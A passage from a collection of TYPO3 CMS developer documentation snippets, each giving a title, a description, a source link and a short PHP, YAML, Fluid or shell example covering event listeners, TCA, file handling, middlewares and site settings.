TYPO3\\CMS\\Backend\\Search\\Event\\BeforeSearchInDatabaseRecordProviderEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(BeforeSearchInDatabaseRecordProviderEvent $event): void\n    {\n        // Exclude the tx_myextension_domain_model_mymodel table from searches\n        $event->addDeniedTable('tx_myextension_domain_model_mymodel');\n\n        // Search only on pages with the given IDs (1, 2, and 42)\n        $event->setSearchPids([1, 2, 42]);\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Running PHPUnit Tests with DDEV\nDESCRIPTION: Command to execute unit tests within a DDEV container. This is useful when the development environment is containerized with DDEV.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/UnitTesting/Running.rst#2025-04-16_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nddev exec php vendor/bin/phpunit -c Build/phpunit/UnitTests.xml\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Countries in TYPO3 Country API\nDESCRIPTION: Demonstrates various methods to retrieve a specific country using the CountryProvider in TYPO3, including by ISO code, English name, and Alpha-3 code.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Country/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n// Get the country by Alpha-2 code\n$france = $this->countryProvider->getByIsoCode('FR');\n\n// Get the country by name\n$france = $this->countryProvider->getByEnglishName('France');\n\n// Get the country by Alpha-3 code\n$france = $this->countryProvider->getByAlpha3IsoCode('FRA');\n```\n\n----------------------------------------\n\nTITLE: Customizing Translation Server URL with ModifyLanguagePackRemoteBaseUrlEvent in TYPO3\nDESCRIPTION: This event listener modifies the base URL for language packages to use a custom translation server for a specific extension. It demonstrates how to intercept the ModifyLanguagePackRemoteBaseUrlEvent to change the translation source URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Custom.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Install\\Service\\Event\\ModifyLanguagePackRemoteBaseUrlEvent;\n\nfinal class CustomMirror\n{\n    public function __invoke(ModifyLanguagePackRemoteBaseUrlEvent $event): void\n    {\n        if ($event->getExtensionKey() === 'my_extension') {\n            $event->setRemoteBaseUrl('https://example.org/typo3-packages/');\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Field Control RenderType in TYPO3\nDESCRIPTION: This snippet shows how to register a custom field control renderType in TYPO3's ext_localconf.php file. It adds a new renderType 'importDataControl' to the FormEngine.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['formEngine']['nodeRegistry'][1687276980] = [\n    'nodeName' => 'importDataControl',\n    'priority' => 40,\n    'class' => \\MyVendor\\MyExtension\\FormEngine\\FieldControl\\ImportDataControl::class\n];\n```\n\n----------------------------------------\n\nTITLE: Retrieving and Loading a File Collection in TYPO3\nDESCRIPTION: This example demonstrates how to retrieve a file collection using the ResourceFactory and load its content. The ResourceFactory provides a convenience method to get a file collection by its UID, which can then be used to access the collection's files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesCollection.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\n$resourceFactory = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\n    \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::class\n);\n\n// Get the file collection with uid 1\n$collection = $resourceFactory->getFileCollectionObject(1);\n\n// Load the contents of the collection\n$collection->loadContents();\n\n```\n\n----------------------------------------\n\nTITLE: Using BeforeRedirectEvent in TYPO3 Frontend Login\nDESCRIPTION: The BeforeRedirectEvent is a PSR-14 event that gets triggered before a redirect is performed in TYPO3's frontend login process. It allows modifying the redirect behavior through event listeners.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/BeforeRedirectEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\FrontendLogin\\Event\\BeforeRedirectEvent\n```\n\n----------------------------------------\n\nTITLE: Implementing IsContentUsedOnPageLayoutEvent Listener in TYPO3\nDESCRIPTION: This code demonstrates how to register a listener for the IsContentUsedOnPageLayoutEvent to control whether content elements with missing parents are marked as 'used' or 'unused' in the page layout view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/IsContentUsedOnPageLayoutEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Listener;\n\nuse TYPO3\\CMS\\Backend\\View\\Event\\IsContentUsedOnPageLayoutEvent;\n\nfinal class ContentUsedOnPage\n{\n    public function __invoke(IsContentUsedOnPageLayoutEvent $event): void\n    {\n        $record = $event->getRecord();\n\n        // Mark content elements with missing parent as 'not used'\n        if ((int)($record['tx_container_parent'] ?? 0) > 0) {\n            $event->setUsed(false);\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyInlineElementEnabledControlsEvent Class in PHP\nDESCRIPTION: This code snippet defines the ModifyInlineElementEnabledControlsEvent class in the TYPO3\\CMS\\Backend\\Form\\Event namespace. It includes properties for various controls and methods to get and set their enabled states.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyInlineElementEnabledControlsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class ModifyInlineElementEnabledControlsEvent\n{\n    private bool $isNewEnabled;\n    private bool $isDeleteEnabled;\n    private bool $isHideEnabled;\n    private bool $isDisableEnabled;\n    private bool $isInfoEnabled;\n\n    public function __construct(\n        bool $isNewEnabled,\n        bool $isDeleteEnabled,\n        bool $isHideEnabled,\n        bool $isDisableEnabled,\n        bool $isInfoEnabled\n    ) {\n        $this->isNewEnabled = $isNewEnabled;\n        $this->isDeleteEnabled = $isDeleteEnabled;\n        $this->isHideEnabled = $isHideEnabled;\n        $this->isDisableEnabled = $isDisableEnabled;\n        $this->isInfoEnabled = $isInfoEnabled;\n    }\n\n    public function isNewEnabled(): bool\n    {\n        return $this->isNewEnabled;\n    }\n\n    public function setIsNewEnabled(bool $isNewEnabled): void\n    {\n        $this->isNewEnabled = $isNewEnabled;\n    }\n\n    public function isDeleteEnabled(): bool\n    {\n        return $this->isDeleteEnabled;\n    }\n\n    public function setIsDeleteEnabled(bool $isDeleteEnabled): void\n    {\n        $this->isDeleteEnabled = $isDeleteEnabled;\n    }\n\n    public function isHideEnabled(): bool\n    {\n        return $this->isHideEnabled;\n    }\n\n    public function setIsHideEnabled(bool $isHideEnabled): void\n    {\n        $this->isHideEnabled = $isHideEnabled;\n    }\n\n    public function isDisableEnabled(): bool\n    {\n        return $this->isDisableEnabled;\n    }\n\n    public function setIsDisableEnabled(bool $isDisableEnabled): void\n    {\n        $this->isDisableEnabled = $isDisableEnabled;\n    }\n\n    public function isInfoEnabled(): bool\n    {\n        return $this->isInfoEnabled;\n    }\n\n    public function setIsInfoEnabled(bool $isInfoEnabled): void\n    {\n        $this->isInfoEnabled = $isInfoEnabled;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing an Event Listener for AfterVideoPreviewFetchedEvent in TYPO3\nDESCRIPTION: Example implementation of an event listener for modifying online media preview files in TYPO3. This listener can be used to update or modify preview files when they are blank or outdated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterVideoPreviewFetchedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Resource\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Resource\\OnlineMedia\\Event\\AfterVideoPreviewFetchedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterVideoPreviewFetchedEvent $event): void\n    {\n        // Add custom code to modify the fetched preview file\n        $previewFile = $event->getPreviewFile();\n\n        // Example: Check and manipulate the preview file\n        // if it's empty, corrupt or simply not up to date.\n        if ($previewFile->getSize() === 0) {\n            // Handle empty preview file\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding BCC Recipient to TYPO3 Mail Message\nDESCRIPTION: Example event listener that adds an additional BCC recipient to an email message before it is sent. This demonstrates how to modify the message object using the BeforeMailerSentMessageEvent.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Mail/BeforeMailerSentMessageEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Mail\\EventListener;\n\nuse Symfony\\Component\\Mime\\Email;\nuse TYPO3\\CMS\\Core\\Mail\\Event\\BeforeMailerSentMessageEvent;\n\nfinal class AddMailMessageBcc\n{\n    public function __invoke(BeforeMailerSentMessageEvent $event): void\n    {\n        $message = $event->getMessage();\n        if ($message instanceof Email) {\n            $message->addBcc('hidden-recipient@example.org');\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Frontend Language Attribute\nDESCRIPTION: Demonstrates how to retrieve the current language information from a TYPO3 frontend request using the language attribute and SiteLanguage object. The code shows how to get the language object and access its locale.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Language.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$language = $request->getAttribute('language');\n$locale = $language->getLocale();\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA for TYPO3 PHP\nDESCRIPTION: This PHP snippet defines a TCA configuration array for the TYPO3 extension 'tea'. It specifies form layout details such as tabs, form fields (title, description, image, owner), and palettes related to access control. The relevant language strings are loaded from locallang files. This configuration is essential for rendering backend forms in TYPO3. There are dependencies on TYPO3 core language files as well as specific locallang files for the 'tea' extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Configuration/TCA/TeaTypes.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'types' => [\n        1 => [\n            'showitem' => '--div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:general,\n                    title, description, image, owner,\n                 --div--;LLL:EXT:tea/Resources/Private/Language/locallang_db.xlf:tx_tea_domain_model_tea.tabs.access,\n                    --palette--;;hidden,\n                    --palette--;;access,',\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic File Field in TCA\nDESCRIPTION: Basic example of defining a file field in a TCA configuration file. This creates a field that can reference or upload files in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Tca.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'columns' => [\n    'my_file_field' => [\n        'label' => 'My file field',\n        'config' => [\n            'type' => 'file',\n            'maxitems' => 6,\n            'allowed' => 'common-image-types',\n        ],\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: PHP Site Settings Access\nDESCRIPTION: Demonstrates how to access site settings through the site object in PHP.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n$color = $site->getSettings()->get('website.background.color');\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFolderDeletedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the BeforeFolderDeletedEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The event is fired before a folder is deleted and allows listeners to perform cleanup operations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFolderDeletedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeFolderDeletedEvent\n{\n    public function __construct(\n        private readonly Folder $folder\n    ) {\n    }\n\n    public function getFolder(): Folder\n    {\n        return $this->folder;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting Files in TYPO3 FAL\nDESCRIPTION: Shows how to delete a file from the FAL system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$file = $storage->getFile('path/to/file.jpg');\n$file->delete();\n```\n\n----------------------------------------\n\nTITLE: Implementing Image Getter with Lazy Loading in Extbase Model\nDESCRIPTION: This snippet demonstrates how to implement a getter method for an image property that uses lazy loading. The method handles the retrieval of a FileReference object with proper null handling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Returns the image.\n */\npublic function getImage(): ?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference\n{\n    return $this->image;\n}\n```\n\n----------------------------------------\n\nTITLE: Overriding Middleware Ordering in TYPO3\nDESCRIPTION: This snippet demonstrates how to change the order of existing middlewares by modifying their 'before' and 'after' configuration in an extension's RequestMiddlewares.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Middlewares.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nreturn [\n    'frontend' => [\n        'typo3/cms-frontend/tsfe' => [\n            'after' => [\n                'typo3/cms-frontend/page-argument-validator',\n                'typo3/cms-frontend/page-resolver',\n                'some-other-middleware'\n            ]\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Accessing Filemetadata Extension Properties\nDESCRIPTION: Shows how to access additional metadata fields provided by the filemetadata extension using the properties accessor in Fluid.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n{fileReference.properties.copyright}\n{fileReference.properties.creator}\n```\n\n----------------------------------------\n\nTITLE: Locale Class Definition in TYPO3 Core API\nDESCRIPTION: PHP class for handling locale settings including language (ISO 639-1/2), script (Unicode ISO 15924), and country/region codes (ISO 3166-1). Implements methods for accessing locale components and language properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/_Locale.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Localization;\n\nclass Locale {\n    public function getName(): string;\n    public function getLanguageCode(): string;\n    public function isRightToLeftLanguageDirection(): bool;\n    public function getLanguageScriptCode(): ?string;\n    public function getCountryCode(): ?string;\n    public function getDependencies(): array;\n    public function __toString(): string;\n}\n```\n\n----------------------------------------\n\nTITLE: Cache Clearing with DataHandler in PHP\nDESCRIPTION: Example of using DataHandler's cache clearing API.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n$this->dataHandler->clear_cacheCmd($cacheCmd);\n```\n\n----------------------------------------\n\nTITLE: Configuring MemoryUsageProcessor in TYPO3\nDESCRIPTION: Configuration options for MemoryUsageProcessor including realMemoryUsage and formatSize parameters that control how memory usage is measured and displayed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Processors/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\ntrue\n```\n\n----------------------------------------\n\nTITLE: TYPO3 ExpressionBuilder TRIM Method Signature\nDESCRIPTION: Method signature for creating TRIM expressions in database queries. The method allows trimming characters from the beginning (LEADING), end (TRAILING), or both sides (BOTH) of a field value. If no position is specified, the default trim behavior is used.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderTrim.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ntrim(string $fieldName, \\Doctrine\\DBAL\\Platforms\\TrimMode $position = \\Doctrine\\DBAL\\Platforms\\TrimMode::UNSPECIFIED, ?string $char = NULL)\n```\n\n----------------------------------------\n\nTITLE: Example Output of Nested Options\nDESCRIPTION: Shows the example output for accessing nested extension configurations via the ExtensionConfiguration API, such as tmp and cache directories.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n\"$extensionConfiguration['directories']['tmp']\\n$extensionConfiguration['directories']['cache']\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving CSP nonce in PHP\nDESCRIPTION: Example of retrieving the Content Security Policy nonce using PHP in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Domain\\ConsumableString\n\n/** @var ConsumableString|null $nonce */\n$nonceAttribute = $this->request->getAttribute('nonce');\nif ($nonceAttribute instanceof ConsumableString) {\n    $nonce = $nonceAttribute->consume();\n}\n```\n\n----------------------------------------\n\nTITLE: Registering an Extbase Plugin in TCA for Backend Use\nDESCRIPTION: Shows how to register an Extbase plugin in the TYPO3 backend by adding it to the TCA. This allows editors to insert the plugin as a content element using ExtensionUtility::registerPlugin().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionUtility::registerPlugin(\n    // extension name (matching the composer name but without vendor)\n    'MyExtension',\n    // arbitrary but unique plugin name (same as in configurePlugin above)\n    'Pi1',\n    // Plugin title visible to editors in the backend\n    'The Plugin Title',\n    // Optional icon identifier\n    'my-extension-pi1'\n);\n```\n\n----------------------------------------\n\nTITLE: Fluid ViewHelper for Multiple FileReference Deletion\nDESCRIPTION: Fluid code example showing how to implement a file deletion checkbox for a specific file within an ObjectStorage of FileReferences in a TYPO3 Extbase form.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_8\n\nLANGUAGE: PHP\nCODE:\n```\n<f:form.uploadDeleteCheckbox property=\"file.0\" fileReference=\"{object.file}\" />\n```\n\n----------------------------------------\n\nTITLE: Creating TYPO3 Console Command Class\nDESCRIPTION: A command class that extends Symfony Command to implement a wizard creation functionality. It handles input arguments, options, and provides error handling through try-catch blocks. The command returns success or failure status codes based on execution results.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Command/Classes/CreateWizardCommandExecute.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\nuse Symfony\\Component\\Console\\Style\\SymfonyStyle;\nuse T3docs\\Examples\\Exception\\InvalidWizardException;\n\nfinal class CreateWizardCommand extends Command\n{\n    protected function execute(\n        InputInterface $input,\n        OutputInterface $output,\n    ): int {\n        $io = new SymfonyStyle($input, $output);\n        $wizardName = $input->getArgument('wizardName');\n        $bruteForce = (bool)$input->getOption('brute-force');\n        try {\n            $this->doMagic($io, $wizardName, $bruteForce);\n        } catch (InvalidWizardException) {\n            return Command::FAILURE;\n        }\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterHistoryRollbackFinishedEvent Class in PHP\nDESCRIPTION: This code snippet defines the AfterHistoryRollbackFinishedEvent class in the TYPO3\\CMS\\Backend\\History\\Event namespace. The event provides access to the history entry and the affected record after a rollback operation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterHistoryRollbackFinishedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterHistoryRollbackFinishedEvent\n{\n    public function __construct(\n        private readonly HistoryEntry $historyEntry,\n        private readonly array $record\n    ) {\n    }\n\n    public function getHistoryEntry(): HistoryEntry\n    {\n        return $this->historyEntry;\n    }\n\n    public function getRecord(): array\n    {\n        return $this->record;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Version-Compatible Middleware Registration for TYPO3 v12 and v13\nDESCRIPTION: Demonstrates how to register a Doctrine DBAL driver middleware that works in both TYPO3 v12 and v13 using version checking.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Information\\Typo3Version;\n\nif ((new Typo3Version())->getMajorVersion() < 13) {\n    // Configuration for TYPO3 v12\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['driverMiddlewares'] = array_merge(\n        $GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['driverMiddlewares'] ?? [],\n        [\n            'my-middleware' => \\Vendor\\Extension\\Driver\\MyDriverMiddleware::class,\n        ]\n    );\n} else {\n    // Configuration for TYPO3 v13\n    $GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['middlewares'] = array_merge(\n        $GLOBALS['TYPO3_CONF_VARS']['DB']['Connections']['Default']['middlewares'] ?? [],\n        [\n            'my-middleware' => [\n                'target' => \\Vendor\\Extension\\Driver\\MyDriverMiddleware::class,\n                'after' => ['typo3/core/custom-platform-driver-middleware'],\n            ],\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Backend History Rollback Event Class\nDESCRIPTION: Defines a PHP class AfterHistoryRollbackFinishedEvent that handles post-rollback events in TYPO3 CMS. The class includes methods to retrieve rollback details, field changes, differences, DataHandler input, and backend user authentication information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/AfterHistoryRollbackFinishedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\History\\Event;\n\nclass AfterHistoryRollbackFinishedEvent\n{\n    public function getRecordHistoryRollback(): \\TYPO3\\CMS\\Backend\\History\\RecordHistoryRollback\n    {\n    }\n\n    public function getRollbackFields(): string\n    {\n    }\n\n    public function getDiff(): array\n    {\n    }\n\n    public function getDataHandlerInput(): array\n    {\n    }\n\n    public function getBackendUserAuthentication(): ?\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a ModifyRecordListTableActionsEvent Listener in TYPO3\nDESCRIPTION: An example implementation of an event listener that modifies the multi record selection actions for a table in the TYPO3 record list. The example shows how to register a listener for the ModifyRecordListTableActionsEvent.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyRecordListTableActionsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\RecordList\\Event\\ModifyRecordListTableActionsEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyRecordListTableActionsEvent $event): void\n    {\n        // Get current actions for this table\n        $actions = $event->getActions();\n\n        // Modify actions\n        $actions['my_action'] = [\n            'label' => 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:recordlist.my_action',\n            'icon' => 'actions-document-view',\n            'action' => 'my_action',\n        ];\n\n        // Set modified actions\n        $event->setActions($actions);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Injecting Registry Class in TYPO3\nDESCRIPTION: Example showing how to inject the Registry class instance using TYPO3 dependency injection\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SystemRegistry/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Registry;\n\nclass MyClass\n{\n    private Registry $registry;\n\n    public function __construct(Registry $registry)\n    {\n        $this->registry = $registry;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP Username - TYPO3 PHP\nDESCRIPTION: This snippet sets the username for SMTP authentication. It is relevant when the transport method requires credentials.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_username'] = '';\n```\n\n----------------------------------------\n\nTITLE: Implementing Person Model Class in TYPO3\nDESCRIPTION: Defines a Person class that extends AbstractEntity with basic personal information fields. The class includes protected string properties for email, firstname, and lastname with empty string defaults.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Validator/ValidatorWithArgumentUsage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass Person extends AbstractEntity\n{\n    protected string $email = '';\n\n    protected string $firstname = '';\n\n    protected string $lastname = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Edit Record Link with Fluid ViewHelper\nDESCRIPTION: Example of using the typo3-backend-uri-editrecord ViewHelper to create an edit record link in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/UriBuilder.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:link.typo3.uri.editRecord table=\"pages\" uid=\"{page.uid}\">\n```\n\n----------------------------------------\n\nTITLE: Generating Code Snippets without DDEV for TYPO3 Documentation\nDESCRIPTION: Commands for generating code snippets without using DDEV. This approach directly uses Composer to install dependencies and then runs the TYPO3 codesnippet command to create documentation snippets.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/CONTRIBUTING.md#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncomposer install\n.Build/vendor/bin/typo3 codesnippet:create Documentation/CodeSnippets/\n```\n\n----------------------------------------\n\nTITLE: Acronym Naming in PHP Variables\nDESCRIPTION: Illustrates the rule for lower camel case in acronym naming for PHP variables, where acronyms should not be fully capitalized.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$someNiceHtmlCode\n```\n\n----------------------------------------\n\nTITLE: Defining Number Settings in YAML\nDESCRIPTION: Example configuration for a number type site setting that accepts integers or floats.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: number\n    label: 'Foo'\n    default: 42.5\n```\n\n----------------------------------------\n\nTITLE: Implementing Property Validator in Extbase\nDESCRIPTION: A custom validator for validating a specific property of a domain model in TYPO3 Extbase, extending AbstractValidator and implementing custom validation logic\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/CustomValidator/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nclass MyPropertyValidator extends AbstractValidator {\n    protected function isValid($value) {\n        if (!/* validation condition */) {\n            $this->addError(\n                'My custom error 